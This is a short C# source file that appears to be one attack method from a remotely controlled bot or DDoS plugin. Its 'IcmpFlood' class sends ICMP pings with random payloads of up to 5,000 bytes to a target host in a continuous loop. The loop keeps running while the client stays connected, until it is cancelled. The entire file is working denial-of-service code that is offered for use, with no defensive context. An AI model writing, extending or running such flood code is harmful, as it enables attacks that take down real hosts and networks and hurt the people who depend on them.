using System.Net.NetworkInformation;
using System.Text;
using Plugin.Helper;

namespace Plugin.Methods;

internal class IcmpFlood : Method
{
	public string Name { get; } = "IcmpFlood";


	public void Run(string host, int port)
	{
		PingOptions options = new PingOptions(64, dontFragment: true);
		Ping ping = new Ping();
		while (Client.itsConnect && !Common.CancellationTokenSource.IsCancellationRequested)
		{
			try
			{
				byte[] bytes = Encoding.ASCII.GetBytes(Randomizer.getRandomCharactersAscii(Randomizer.random.Next(10, 5000)));
				ping.Send(host, 5000, bytes, options);
			}
			catch
			{
				ping.Dispose();
				ping = new Ping();
			}
		}
		ping.Dispose();
	}
}
